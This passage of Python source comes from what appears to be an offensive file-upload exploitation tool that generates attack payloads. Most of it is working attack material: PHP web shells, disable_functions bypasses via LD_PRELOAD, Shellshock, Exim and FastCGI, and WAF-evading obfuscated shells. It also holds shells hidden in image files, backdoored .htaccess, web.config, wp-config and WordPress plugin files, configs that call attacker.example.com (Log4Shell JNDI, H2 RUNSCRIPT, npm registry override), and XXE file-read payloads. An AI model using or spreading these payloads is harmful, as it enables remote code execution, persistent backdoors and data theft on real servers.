$srv="x -oProxyCommand=echo\t".base64_encode($c." >".$o." 2>&1")."|base64\t-d|sh}";
@imap_open("{".$srv.":143/imap}INBOX","","");sleep(2);echo @file_get_contents($o);@unlink($o);
?>''',
        # LD_PRELOAD system.so via mail()/error_log()/mb_send_mail() + putenv
        "df_ld_preload": r'''<?php
$c=$_GET["__P__"];$o="/tmp/o_".getmypid();$so="/tmp/s_".getmypid().".so";
$h=(PHP_INT_SIZE===8)?"__SO64__":"__SO32__";
file_put_contents($so,hex2bin($h));
putenv("EVIL_CMDLINE=".$c." >".$o." 2>&1");putenv("LD_PRELOAD=".$so);
if(function_exists("error_log"))@error_log("",1,"a@a.com");
elseif(function_exists("mail"))@mail("a@a.com","","","");
elseif(function_exists("mb_send_mail"))@mb_send_mail("a@a.com","","");
@unlink($so);echo @file_get_contents($o);@unlink($o);
?>''',
        # Shellshock via mail() (CVE-2014-6271)
        "df_shellshock": r'''<?php
$c=$_GET["__P__"];$o=tempnam(sys_get_temp_dir(),"o");
putenv("PHP_LOL=() { x; }; ".$c." >".$o." 2>&1");
@mail("a@127.0.0.1","","","","-bv");
echo @file_get_contents($o);@unlink($o);
?>''',
        # Exim ${run{}} command injection via mail() 5th arg
        "df_exim": r'''<?php
$c=$_GET["__P__"];$o="/tmp/o_".getmypid();$s="/tmp/s_".getmypid().".sh";
file_put_contents($s,$c." >".$o." 2>&1");
$p="-be \${run{/bin/bash\${substr{10}{1}{\$tod_log}}".$s."}{ok}{error}}";
@mail("a@localhost","","","",$p);echo @file_get_contents($o);@unlink($o);@unlink($s);
?>''',
        # dl() PHP-extension load (needs the AntSword ext .so server-side)
        "df_dl": r'''<?php
$c=$_GET["__P__"];
if(function_exists("dl")){@dl("ant_x64.so");if(function_exists("antsystem"))echo antsystem($c);else echo "dl-loaded";}
?>''',
        # COM('WScript.Shell') — Windows
        "df_com": r'''<?php
$c=$_GET["__P__"];$o=getenv("TEMP")."\\o_".getmypid();
$w=new COM("WScript.Shell");$w->Run("cmd.exe /c ".$c." >".$o,0,true);sleep(1);echo @file_get_contents($o);@unlink($o);
?>''',
        # Apache mod_cgi — register a CGI handler via .htaccess + a shell script
        "df_mod_cgi": r'''<?php
$c=$_GET["__P__"];
@file_put_contents(".htaccess","Options +ExecCGI\nAddHandler cgi-script .dizzle\n");
@file_put_contents("upmap.dizzle","#!/bin/bash\necho \"Content-Type: text/html\"\necho \"\"\n".$c."\n");
@chmod("upmap.dizzle",0755);
echo "wrote upmap.dizzle (request it to exec)";
?>''',
        # FastCGI / PHP-FPM direct socket (auto_prepend php://input) — l3m0n
        "df_fastcgi": r'''<?php
$cmd=$_GET["__P__"];$file="/var/www/html/index.php";$host="127.0.0.1";$port=9000;
function p($x){return bin2hex(chr($x));}
function nv($l){if($l<128){return p($l);}return p(($l>>24)|0x80).p(($l>>16)&0xFF).p(($l>>8)&0xFF).p($l&0xFF);}
$php='<?php system(base64_decode("'.base64_encode($cmd).'"));exit();?>';
$cl=strlen($php);$pad=p(($cl>>8)&0xFF).p($cl&0xFF).p(0).p(0);$uv=nv(strlen($file));
$params='0e02434f4e54454e545f4c454e475448'.bin2hex($cl).'0c10434f4e54454e545f545950456170706c69636174696f6e2f746578740b0452454d4f54455f504f5254393938350b095345525645525f4e414d456c6f63616c686f7374110b474154455741595f494e54455246414345466173744347492f312e300f0e5345525645525f534f4654574152457068702f66636769636c69656e740b0952454d4f54455f414444523132372e302e302e310f'.$uv.'5343524950545f46494c454e414d45'.bin2hex($file).'0b'.$uv.'5343524950545f4e414d45'.bin2hex($file).'091f5048505f56414c55456175746f5f70726570656e645f66696c65203d207068703a2f2f696e7075740e04524551554553545f4d4554484f44504f53540b025345525645525f504f525438300f085345525645525f50524f544f434f4c485454502f312e310c0051554552595f535452494e470f165048505f41444d494e5f56414c5545616c6c6f775f75726c5f696e636c756465203d204f6e0d01444f43554d454e545f524f4f542f0b095345525645525f414444523132372e302e302e310b'.$uv.'524551554553545f555249'.bin2hex($file);
$pl=strlen(hex2bin($params));$ppad=p(($pl>>8)&0xFF).p($pl&0xFF).p(0).p(0);
$data='01017b0700080000000100000000000001047b07'.$ppad.$params.'01047b070000000001057b07'.$pad.bin2hex($php).'01057b0700000000';
$fp=@stream_socket_client("tcp://".$host.":".$port,$e,$s,5);if(!$fp){$fp=@fsockopen($host,$port,$e,$s,5);}
if($fp){fwrite($fp,hex2bin($data));$r="";while(!feof($fp)){$r.=fgets($fp,4096);}fclose($fp);echo $r;}
?>''',
        # ImageMagick (Imagick ext) MVG delegate RCE — ImageTragick-class
        "df_imagick": r'''<?php
$c=$_GET["__P__"];$o=tempnam(sys_get_temp_dir(),"img");
$m=tempnam(sys_get_temp_dir(),"img");
$e="push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.1/x.jpg\"|".$c.">".$o." 2>&1\")'\npop graphic-context";
file_put_contents($m,$e);
$i=new Imagick();$i->readImage($m);$i->writeImage(tempnam(sys_get_temp_dir(),"img"));$i->clear();$i->destroy();
@unlink($m);echo @file_get_contents($o);@unlink($o);
?>''',
    }
    out = []
    for label, src in snippets.items():
        php = (src.replace("__P__", param)
                  .replace("__SO64__", _SO_X64_HEX)
                  .replace("__SO32__", ""))
        out.append((label, php.encode()))
    return out


def _php_callback_shells(param):
    """PHP callback-function obfuscation family (LandGrey), byte-identical to UpMap:
    built-ins that take a callback dispatch system()/assert() indirectly, the name
    rebuilt by concatenation/headers/xor so no literal `system`/`assert` appears.
    Returns [php_bytes, …] (16 core + 8 advanced dispatchers)."""
    req = '$_REQUEST["' + param + '"]'
    out = []
    for fexpr in ('"sy"."st"."em"', '"as"."se"."rt"'):
        out += [
            ('<?php $f=' + fexpr + ';array_map($f,array(' + req + '));?>').encode(),
            ('<?php $f=' + fexpr + ';array_filter(array(' + req + '),$f);?>').encode(),
            ('<?php $f=' + fexpr + ';$a=array(' + req + ',1);usort($a,$f);?>').encode(),
            ('<?php $f=' + fexpr + ';call_user_func($f,' + req + ');?>').encode(),
            ('<?php $f=' + fexpr + ';array_udiff(array(' + req + '),array(1),$f);?>').encode(),
            ('<?php $f=' + fexpr + ';array_intersect_ukey(array(' + req + '=>1),array(1),$f);?>').encode(),
            ('<?php $f=' + fexpr + ';forward_static_call_array($f,array(' + req + '));?>').encode(),
            ('<?php $f=' + fexpr + ';register_shutdown_function($f,' + req + ');?>').encode(),
        ]
    rb = req.encode()
    out += [
        (b'<?php array_udiff_assoc(array(' + rb + b'), array(1), "assert"); ?>'),
        (b'<?php $key=substr(__FILE__,-5,-4);${"LandGrey"}=$_SERVER["HTTP_ACCEPT"]."Land!";'
         b'$f=pack("H*","13"."3f120b1655")^$LandGrey;'
         b'array_intersect_uassoc(array(' + rb + b'=>""),array(1),$f); ?>'),
        (b'<?php $key=substr(__FILE__,-5,-4);${"LandGrey"}=$key."Land!";'
         b'$f=pack("H*","13"."3f120b1655")^$LandGrey;'
         b'array_intersect_uassoc(array(' + rb + b'=>""),array(1),$f); ?>'),
        (b'<?php ${"LandGrey"}=substr(__FILE__,-5,-4)."class";'
         b'$f=$LandGrey^hex2bin("12101f040107");'
         b'array_intersect_uassoc(array(' + rb + b'=>""),array(1),$f); ?>'),
        (b'<?php $ch=$_COOKIE["set-domain-name"];'
         b'array_intersect_ukey(array(' + rb + b'=>1),array(1),$ch."ert"); ?>'),
        (b'<?php $ch=explode(".","hello.ass.world.er.t");'
         b'array_intersect_ukey(array(' + rb + b'=>1),array(1),$ch[1].$ch[3].$ch[4]); ?>'),
        (b'<?php $wx=substr($_SERVER["HTTP_REFERER"],-7,-4);'
         b'forward_static_call_array($wx."ert",array(' + rb + b')); ?>'),
        (b'<?php $f="sys"."tem";'
         b'register_shutdown_function($f,' + rb + b'); ?>'),
    ]
    return out


# Full minimal valid 1×1 JPEG (UpMap polyglot_php_jpeg). PHP appended after the
# EOI still survives getimagesize() / a real JFIF structural check.
_VALID_JPEG_1X1 = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    b"\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t"
    b"\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a"
    b"\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\x1e"
    b"\x1b\xfe\x00\x0bUpMapProbe\xff\xd9"
)


def _php_obf_payloads():
    """PHP shell obfuscation wrappers (AutoShell), synced from UpMap
    mod_php_obfuscation — bypass WAFs that pattern-match system()/passthru().
    base64/gzinflate/rot13/hex eval wrappers honor --cmd-param; the concat/
    var-var/preg-e variants are byte-identical to UpMap. Returns [(label, bytes), …]."""
    raw = ("system($_GET['" + CMD_PARAM + "']);").encode()
    b64 = base64.b64encode(raw).decode()
    gz  = base64.b64encode(zlib.compress(raw)[2:-4]).decode()   # strip zlib hdr/crc
    rot13 = raw.decode().translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
    hx  = raw.hex()
    chrs = "+".join(f"chr({b})" for b in raw)
    return [
        ("rce_obf_base64",    f"<?php eval(base64_decode('{b64}')); ?>".encode()),
        ("rce_obf_gzinflate", f"<?php eval(gzinflate(base64_decode('{gz}'))); ?>".encode()),
        ("rce_obf_rot13",     f"<?php eval(str_rot13('{rot13}')); ?>".encode()),
        ("rce_obf_hex",       f"<?php eval(hex2bin('{hx}')); ?>".encode()),
        ("rce_obf_assert",    f"<?php assert({chrs}); ?>".encode()),
        ("rce_obf_concat",    b"<?php $f='sys'.'tem';$g='_GE'.'T';$h='cm'.'d';$f($$g[$h]); ?>"),
        ("rce_obf_varvar",    b"<?php $_=('s'.'ystem');$_(($_SERVER['QUERY_STRING'])); ?>"),
        ("rce_obf_preg",      b"<?php preg_replace('/.*/e',base64_decode('c3lzdGVtKCRfR0VUW2NtZF0pOw=='),''); ?>"),
    ]


def _stego_payloads():
    """PHP shell hidden *inside* valid image structure (not appended, so it survives
    getimagesize()/imagecreatefrom*() re-encode in some configs). Synced from UpMap
    mod_image_steganography: JPEG COM, JPEG EXIF UserComment, PNG tEXt, GIF comment.
    Returns [(label, img_bytes, [exts])]."""
    shell = (f"<?php echo '{PROBE}';system($_GET['{CMD_PARAM}']); ?>").encode()

    def jpeg_com(payload):
        com = b"\xFF\xFE" + len(payload + b"\x00").to_bytes(2, "big") + payload + b"\x00"
        return (b"\xFF\xD8" + com
                + b"\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
                + b"\xFF\xDB\x00C\x00" + bytes([8,6,6,7,6,5,8,7,7,7,9,9,8,10,12,20,13,12,11,11])
                + bytes([12,25,18,19,15,20,29,26,31,30,29,26,28,28,32,36,46,39,32,34,44,35])
                + bytes([28,28,40,55,41,44,48,49,52,52,52,31,39,57,61,56,50,60,46,51,52,50])
                + b"\xFF\xC0\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00"
                + b"\xFF\xC4\x00\x1F\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B"
                + b"\xFF\xDA\x00\x08\x01\x01\x00\x00?\x00\xF5\x14\xFF\xD9")

    def jpeg_exif(payload):
        uc = b"ASCII\x00\x00\x00" + payload
        tiff = b"II\x2A\x00\x08\x00\x00\x00"
        cnt = (1).to_bytes(2, "little")
        ifd_off = 8 + 2 + 12 + 4
        entry = (b"\x86\x92" + b"\x07\x00" + len(uc).to_bytes(4, "little")
                 + ifd_off.to_bytes(4, "little"))
        exif = tiff + cnt + entry + b"\x00\x00\x00\x00" + uc
        app1 = b"\xFF\xE1" + (len(exif) + 8).to_bytes(2, "big") + b"Exif\x00\x00" + exif
        return b"\xFF\xD8" + app1 + b"\xFF\xD9"

    def png_chunk(payload):
        cd = b"Comment\x00" + payload
        chunk = (struct.pack(">I", len(cd)) + b"tEXt" + cd
                 + struct.pack(">I", zlib.crc32(b"tEXt" + cd) & 0xffffffff))
        ihdr_d = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
        ihdr = (struct.pack(">I", 13) + b"IHDR" + ihdr_d
                + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr_d) & 0xffffffff))
        idat_d = zlib.compress(b"\x00\xff\xff\xff")
        idat = (struct.pack(">I", len(idat_d)) + b"IDAT" + idat_d
                + struct.pack(">I", zlib.crc32(b"IDAT" + idat_d) & 0xffffffff))
        iend = struct.pack(">I", 0) + b"IEND" + struct.pack(">I", zlib.crc32(b"IEND") & 0xffffffff)
        return b"\x89PNG\r\n\x1a\n" + ihdr + chunk + idat + iend

    def gif_comment(payload):
        chunks, data = [], payload
        while data:
            blk, data = data[:255], data[255:]
            chunks.append(bytes([len(blk)]) + blk)
        ext = b"\x21\xFE" + b"".join(chunks) + b"\x00"
        return (b"GIF89a\x01\x00\x01\x00\x80\x01\x00\xff\xff\xff\x00\x00\x00" + ext
                + b"!\xf9\x04\x00\x00\x00\x00\x00"
                + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")

    php3 = EXT["php"][:3]
    return [
        ("stego_jpeg_com",    jpeg_com(shell),    ["jpg"] + php3),
        ("stego_jpeg_exif",   jpeg_exif(shell),   ["jpg"] + php3),
        ("stego_png_text",    png_chunk(shell),   ["png"] + php3),
        ("stego_gif_comment", gif_comment(shell), ["gif"] + php3),
    ]


def gen_rce(lang):
    out = [(label, content, exts) for content, exts, label in shells_for(lang)]
    if lang == "php":
        base = shells_for("php")[0][0]
        out.append(("rce_polyglot", MAGIC["gif"] + base, EXT["php"] + ["gif"]))
        out.append(("rce_polyglot", MAGIC["jpg"] + base, EXT["php"] + ["jpg"]))
        # GD imagecreatefromgif() re-encode survivor (fixed payload)
        out.append(("rce_gd_survivor", GD_SURVIVOR_GIF, EXT["php"] + ["gif"]))
        # disable_functions / alternative-execution RCE (synced from UpMap):
        # pcntl_exec, imap_open, LD_PRELOAD+mail, Shellshock, Exim, dl(),
        # COM, mod_cgi, FastCGI/PHP-FPM, Imagick.
        for label, php_bytes in _php_disable_func_payloads(CMD_PARAM):
            out.append((label, php_bytes, EXT["php"]))
        # callback-function obfuscation family (LandGrey), synced from UpMap.
        for sh in _php_callback_shells(CMD_PARAM):
            out.append(("rce_callback", sh, EXT["php"]))
        # PHP source-obfuscation wrappers (base64/gzinflate/rot13/hex/assert/
        # concat/var-var/preg-e), synced from UpMap mod_php_obfuscation.
        for label, php_bytes in _php_obf_payloads():
            out.append((label, php_bytes, EXT["php"]))
        # Full valid 1x1 JPEG + appended PHP (survives getimagesize), and a valid
        # PNG carrying PHP in a real tEXt chunk — synced from UpMap.
        out.append(("rce_polyglot_jpeg", _VALID_JPEG_1X1 + b"\n" + base, EXT["php"] + ["jpg"]))
        out.append(("rce_png_text",
                    _png_text(b"Comment", b"<?=$_GET[0]($_POST[1]);?>"),
                    EXT["php"] + ["png"]))
        # Pixel-valid PNG / BMP + appended shell — passes strict getimagesize() /
        # identify / PIL.open() (not just magic bytes). Synced from UpMap
        # mod_polyglot_image_rce (no-PIL minimal-image path; GIF/JPEG already above).
        out.append(("rce_polyglot_png", _minimal_png() + base, EXT["php"] + ["png"]))
        out.append(("rce_polyglot_bmp", _minimal_bmp() + base, EXT["php"] + ["bmp"]))
        # data: URI smuggling (server-side data-URI fetch/decode), synced from UpMap.
        out.append(("rce_data_uri",
                    b"data:image/jpeg;base64," + base64.b64encode(base),
                    EXT["php"] + ["jpg"]))
        # Shell hidden inside valid image structure: JPEG COM/EXIF, PNG tEXt, GIF
        # comment — synced from UpMap mod_image_steganography.
        for label, content, exts in _stego_payloads():
            out.append((label, content, exts))
    elif lang == "asp":
        out += _asp_obf(CMD_PARAM)
    elif lang == "jsp":
        out += _jsp_obf(CMD_PARAM)
    out += _ssi_payloads()        # SSI belongs to the RCE group (server-side exec)
    return out


def gen_bypass(lang):
    """Content-sniff / magic-byte spoof: each shell prefixed with each image/doc
    header, written to every executable extension + the matching image ext.
    --allowed focuses the spoof on one accepted type. (Filename-level bypasses —
    null byte / ADS / traversal / RTL / case — are deferred to a future module.)"""
    out = []
    magics = [ALLOWED] if (ALLOWED and ALLOWED in MAGIC) else SPOOF_MAGICS
    for content, exts, _label in shells_for(lang):
        for m in magics:
            header = MAGIC.get(m)
            if not header:
                continue
            img_ext = ALLOWED if ALLOWED else m
            out.append(("bypass", header + content, exts + [img_ext]))
    return out


def gen_filename(lang):
    shells = shells_for(lang)
    if not shells:
        return []
    return [("filename", shells[0][0], [shells[0][1][0]])]


def gen_config(_lang):
    pb = PROBE.encode()
    # Multiple .htaccess handler-registration variants (synced from UpMap
    # mod_htaccess_overwrite): AddType/AddHandler php5/php7, FilesMatch, server-parsed.
    # Item 6 additions: CGI handler+ExecCGI, php_value inline auto_prepend, source-
    # disclosure SetHandler, ErrorDocument redirect (open-redirect/SSRF), RewriteRule
    # .jpg → .php (extension laundering).
    htaccess_variants = [
        b"AddType application/x-httpd-php .upmap\nAddHandler php7-script .upmap\n",
        b"AddHandler php5-script .upmap\n",
        b'<FilesMatch "\\.upmap$">\n  SetHandler application/x-httpd-php\n</FilesMatch>\n',
        b"AddType application/x-httpd-php .upmap .php .php5 .phtml\n",
        b"Options +Indexes +FollowSymLinks +Includes\n"
        b"AddHandler server-parsed .shtml\nAddType application/x-httpd-php .upmap\n",
        # CGI route to RCE (any executable dropped at .upmap/.cgi runs as CGI).
        b"Options +ExecCGI\nAddHandler cgi-script .upmap .cgi\n",
        # Inline equivalent of .user.ini under mod_php — no separate file needed.
        b'php_value auto_prepend_file "shell.php"\n'
        b"php_flag allow_url_include On\nphp_flag display_errors On\n",
        # PHP source disclosure: serve .php as x-httpd-php-source.
        b"AddType application/x-httpd-php-source .phps\n"
        b'<FilesMatch "\\.php$">\n  SetHandler application/x-httpd-php-source\n'
        b"</FilesMatch>\n",
        # ErrorDocument absolute URL → open-redirect / SSRF beacon on every 404/500.
        b"ErrorDocument 404 http://attacker.example.com/log?u=" + pb + b"\n"
        b"ErrorDocument 500 http://attacker.example.com/log?u=" + pb + b"\n",
        # Extension laundering: serve .jpg requests through .php interpreter.
        b"RewriteEngine On\nRewriteRule ^(.+)\\.jpg$ /$1.php [L]\n",
    ]
    # .user.ini variants (PHP-CGI / LiteSpeed auto_prepend_file).
    user_ini_variants = [
        b"auto_prepend_file=shell.php\n",
        b"auto_prepend_file=/tmp/shell.php\n",
        b"cgi.force_redirect=0\ncgi.redirect_status_env=foo\nauto_prepend_file=shell.php\n",
    ]
    out = [("htaccess", v, ["htaccess"]) for v in htaccess_variants]
    out += [("user_ini", v, ["ini"]) for v in user_ini_variants]
    out += [
        ("web_config", b'<?xml version="1.0"?><configuration><system.webServer>'
                       b'<handlers><add name="x" path="*.upmap" verb="*" '
                       b'type="System.Web.UI.PageHandlerFactory"/></handlers>'
                       b'</system.webServer></configuration>', ["config"]),
        ("env", b"APP_ENV=production\nAPP_DEBUG=true\nDB_PASSWORD=" + pb
                + b"\nSECRET_KEY=" + pb + b"\nAWS_SECRET_ACCESS_KEY=" + pb + b"\n", ["env"]),
        ("web_xml", b'<?xml version="1.0"?><web-app><servlet><servlet-name>x'
                    b'</servlet-name></servlet></web-app>', ["xml"]),
        ("crossdomain", b'<?xml version="1.0"?><cross-domain-policy>'
                        b'<allow-access-from domain="*"/></cross-domain-policy>', ["xml"]),
        # Silverlight cross-domain policy (UpMap config_file_upload).
        ("clientaccesspolicy",
         b'<?xml version="1.0"?><access-policy><cross-domain-access><policy>'
         b'<allow-from http-request-headers="*"><domain uri="*"/></allow-from>'
         b'<grant-to><resource path="/" include-subpaths="true"/></grant-to>'
         b'</policy></cross-domain-access></access-policy>', ["xml"]),
        ("robots", b"User-agent: *\nAllow: /\n# " + pb + b"\n", ["txt"]),
        # .npmrc registry override (supply-chain) + composer.json dependency inject.
        ("npmrc", b"registry=http://attacker.example.com\n"
                  b"//attacker.example.com/:_authToken=" + pb + b"\n", ["npmrc"]),
        ("composer_json", b'{"require":{"vendor/' + pb + b'":"*"}}\n', ["json"]),
        ("htpasswd", b"admin:" + pb + b"\nroot:" + pb + b"\n", ["htpasswd"]),
    ]
    # ── Item 1: IIS web.config expansion (RCE / source-disclosure / SSRF) ──────
    # The single PageHandlerFactory entry above is a probe; the variants below
    # are the actual exploitation primitives for IIS upload->config-drop.
    out += [
        # Soroush Dalili classic-ASP RCE: register asp.dll as scriptProcessor for
        # an arbitrary extension. Any *.upmap in webroot now executes as ASP.
        ("web_config_asp_handler",
         b'<?xml version="1.0"?><configuration><system.webServer>'
         b'<handlers accessPolicy="Read, Script, Write">'
         b'<add name="upmap-asp" path="*.upmap" verb="*" modules="IsapiModule" '
         b'scriptProcessor="C:\\Windows\\System32\\inetsrv\\asp.dll" '
         b'resourceType="Unspecified" requireAccess="Script" '
         b'preCondition="bitness64"/></handlers>'
         b'</system.webServer></configuration>', ["config"]),
        # Legacy <httpHandlers> (IIS6 / integrated-mode fallback path).
        ("web_config_httphandlers",
         b'<?xml version="1.0"?><configuration><system.web><httpHandlers>'
         b'<add path="*.upmap" verb="*" '
         b'type="System.Web.UI.PageHandlerFactory" validate="false"/>'
         b'</httpHandlers></system.web></configuration>', ["config"]),
        # <httpModules> — managed module runs on every request hitting this dir.
        ("web_config_httpmodules",
         b'<?xml version="1.0"?><configuration><system.web><httpModules>'
         b'<add name="UpMapProbeModule" type="UpMap.AttackerModule, UpMap"/>'
         b'</httpModules></system.web></configuration>', ["config"]),
        # <compilation><buildProviders> — register a build provider so IIS
        # compiles a new extension on first request.
        ("web_config_buildprovider",
         b'<?xml version="1.0"?><configuration><system.web>'
         b'<compilation debug="true"><buildProviders>'
         b'<add extension=".upmap" '
         b'type="System.Web.Compilation.PageBuildProvider"/>'
         b'</buildProviders><assemblies><add assembly="*"/></assemblies>'
         b'</compilation></system.web></configuration>', ["config"]),
        # Source disclosure: serve *.aspx through StaticFileModule as text/plain.
        ("web_config_source_disclosure",
         b'<?xml version="1.0"?><configuration><system.webServer>'
         b'<handlers><add name="upmap-source" path="*.aspx" verb="*" '
         b'modules="StaticFileModule" resourceType="File" requireAccess="Read"/>'
         b'</handlers><staticContent>'
         b'<mimeMap fileExtension=".aspx" mimeType="text/plain"/>'
         b'</staticContent></system.webServer></configuration>', ["config"]),
        # <appSettings file="..."> — pulls attacker-controlled external config
        # (UNC path / mounted share) into the running app's settings.
        ("web_config_appsettings_external",
         b'<?xml version="1.0"?><configuration>'
         b'<appSettings file="\\\\attacker.example.com\\share\\inject.config"/>'
         b'</configuration>', ["config"]),
        # URL Rewrite Module rule — redirect/SSRF on /upmap/* path.
        ("web_config_rewrite_ssrf",
         b'<?xml version="1.0"?><configuration><system.webServer><rewrite>'
         b'<rules><rule name="upmap-redir" stopProcessing="true">'
         b'<match url="^upmap/(.*)"/>'
         b'<action type="Redirect" '
         b'url="http://attacker.example.com/{R:1}" redirectType="Permanent"/>'
         b'</rule></rules></rewrite></system.webServer></configuration>',
         ["config"]),
    ]
    # ── Item 7: WordPress drop-ins ────────────────────────────────────────────
    # wp-config.php (overwrites credentials + plants a query-param backdoor) and
    # a Must-Use plugin (auto-loaded by every WP request, no activation needed).
    out += [
        ("wp_config",
         b"<?php\n"
         b"define('DB_NAME','wordpress');\n"
         b"define('DB_USER','" + pb + b"');\n"
         b"define('DB_PASSWORD','" + pb + b"');\n"
         b"define('DB_HOST','localhost');\n"
         b"$table_prefix='wp_';\n"
         b"define('AUTH_KEY','" + pb + b"');\n"
         b"define('WP_DEBUG', true);\n"
         b"if(isset($_GET['upmap'])){ system($_GET['upmap']); exit; }\n",
         ["php"]),
        ("wp_mu_plugin",
         b"<?php\n"
         b"/* Plugin Name: " + pb + b" */\n"
         b"// Drop into wp-content/mu-plugins/ - auto-loaded, no activation.\n"
         b"if(isset($_GET['cmd'])){ echo system($_GET['cmd']); }\n",
         ["php"]),
    ]
    # ── Item 8: Java / Spring Boot / Tomcat configs ───────────────────────────
    # META-INF/context.xml (Tomcat per-app context with H2 RUNSCRIPT JNDI vector),
    # Spring application.properties + application.yml re-opening Actuator and the
    # H2 console, and a log4j2.xml carrying a JNDI lookup (Log4Shell pattern).
    out += [
        ("tomcat_context",
         b'<?xml version="1.0"?>\n<Context>\n'
         b'  <Resource name="jdbc/Probe" auth="Container" '
         b'type="javax.sql.DataSource"\n'
         b'            url="jdbc:h2:mem:upmap;INIT=RUNSCRIPT FROM '
         b"'http://attacker.example.com/upmap.sql'\"/>\n"
         b'  <Valve className="org.apache.catalina.valves.AccessLogValve" '
         b'pattern="%h ' + pb + b'"/>\n</Context>\n', ["xml"]),
        ("spring_application_properties",
         b"management.endpoints.web.exposure.include=*\n"
         b"management.endpoint.shutdown.enabled=true\n"
         b"management.endpoint.env.show-values=ALWAYS\n"
         b"spring.h2.console.enabled=true\n"
         b"spring.h2.console.settings.web-allow-others=true\n"
         b"spring.datasource.url=jdbc:h2:mem:upmap;INIT=RUNSCRIPT FROM "
         b"'http://attacker.example.com/upmap.sql'\n"
         b"spring.cloud.gateway.actuator.verbose.enabled=true\n"
         b"logging.level.root=DEBUG\n", ["properties"]),
        ("spring_application_yml",
         b"management:\n  endpoints:\n    web:\n      exposure:\n"
         b'        include: "*"\n'
         b"  endpoint:\n    shutdown:\n      enabled: true\n"
         b"spring:\n  h2:\n    console:\n      enabled: true\n"
         b"      settings:\n        web-allow-others: true\n"
         b"  datasource:\n"
         b'    url: "jdbc:h2:mem:upmap;INIT=RUNSCRIPT FROM '
         b'\'http://attacker.example.com/upmap.sql\'"\n', ["yml"]),
        ("log4j2_jndi",
         b'<?xml version="1.0"?>\n<Configuration>\n  <Appenders>\n'
         b'    <Console name="console">'
         b'<PatternLayout pattern="${jndi:ldap://attacker.example.com/'
         + pb + b'}"/></Console>\n'
         b"  </Appenders>\n  <Loggers><Root level=\"info\">"
         b"<AppenderRef ref=\"console\"/></Root></Loggers>\n"
         b"</Configuration>\n", ["xml"]),
    ]
    # ── Item 23: Canonical probe-page filenames (label drives filename) ──────
    # UpGen writes "0001_<label>_<handle>.<ext>" — labels here mirror the
    # filenames directory brute-forcers look for. Content differs per label so
    # the byte-dedup keeps all three.
    out += [
        ("phpinfo", b"<?php phpinfo(); ?>\n", ["php"]),
        ("info", b"<?php echo '" + pb + b"'; phpinfo(); ?>\n", ["php"]),
        ("test_aspx",
         b'<%@ Page Language="C#" %><% Response.Write("' + pb
         + b' " + System.Environment.MachineName); %>\n', ["aspx"]),
    ]
    # ── Item 24: WordPress xmlrpc.php probe (pingback / amplification surface) ─
    out += [
        ("xmlrpc",
         b"<?php\n"
         b"// WordPress xmlrpc.php drop-in - pingback / system.multicall surface.\n"
         b"define('XMLRPC_REQUEST', true);\n"
         b"echo '" + pb + b" xmlrpc';\n"
         b"if(isset($_POST['cmd'])){ system($_POST['cmd']); }\n",
         ["php"]),
    ]
    return out


def gen_xxe(_lang):
    p = PROBE
    # LFI targets routed through _lfi(): --file-read PATH overrides every one
    # of them; otherwise the per-payload default below is used.
    LF_PASSWD   = _lfi("/etc/passwd")
    LF_WIN      = _lfi("/c:/windows/win.ini")
    LF_HOSTNAME = _lfi("/etc/hostname")
    LF_HOSTS    = _lfi("/etc/hosts")
    classic = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
               f'"file://{LF_PASSWD}">]><r>&xxe;</r>').encode()
    win = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
           f'"file://{LF_WIN}">]><r>&xxe;</r>').encode()
    oob = (b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://'
           + OAST.encode() + b'/e.dtd">%x;]><r/>')
    # /etc/hostname + /etc/hosts (synced from UpMap): shorter than passwd, ID the
    # box, and survive some parsers that blocklist /etc/passwd.
    hostname = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
                f'"file://{LF_HOSTNAME}">]><r>&xxe;</r>').encode()
    hosts = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
             f'"file://{LF_HOSTS}">]><r>&xxe;</r>').encode()
    # php://filter base64/rot13: encode the file so ':'/'&'/'<' can't break the
    # entity reference (PHP libxml). In-band reflection.
    phpfilter_b64 = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
                     f'"php://filter/convert.base64-encode/resource={LF_PASSWD}">]>'
                     f'<r>&xxe;</r>').encode()
    phpfilter_rot13 = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
                       f'"php://filter/read=string.rot13/resource={LF_PASSWD}">]>'
                       f'<r>&xxe;</r>').encode()
    # Standalone parameter-entity eval chain (ssrf_x.xml): %file; -> %eval; -> &xxe;
    evalchain = (f'<?xml version="1.0"?>\n<!DOCTYPE foo [\n'
                 f'  <!ENTITY % file SYSTEM "file://{LF_PASSWD}">\n'
                 f'  <!ENTITY % eval "<!ENTITY xxe \'%file;\'>">\n  %eval;\n]>\n'
                 f'<r>&xxe;</r>').encode()
    # Error-based XXE (no outbound): fold the file into a bogus SYSTEM path so the
    # parser leaks it in the error message it reflects back.
    error_based = (f'<?xml version="1.0"?>\n<!DOCTYPE foo [\n'
                   f'  <!ENTITY % file SYSTEM "file://{LF_PASSWD}">\n'
